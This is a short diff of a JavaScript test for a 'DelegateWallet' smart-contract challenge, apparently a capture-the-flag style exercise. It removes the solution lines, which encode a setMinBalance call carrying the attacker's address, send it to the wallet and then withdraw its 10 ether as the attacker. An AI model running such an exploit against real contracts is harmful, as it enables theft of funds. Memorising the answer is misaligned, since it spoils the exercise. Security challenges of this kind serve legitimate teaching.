@@ -27,16 +27,7 @@ describe("DelegateWallet", function () {
     await delegateWallet.deposit({ value: constants.WeiPerEther.mul(10) });
 
     // Exploit start
-    const contractInterface = new utils.Interface([
-      "function setMinBalance(uint256 balance)",
-    ]);
-    const data = contractInterface.encodeFunctionData("setMinBalance", [
-      attacker.address,
-    ]);
-    await attacker.sendTransaction({ to: delegateWallet.address, data });
-    await delegateWallet
-      .connect(attacker)
-      .withdraw(constants.WeiPerEther.mul(10));
+
     // Exploit end
 
     // Completion condition
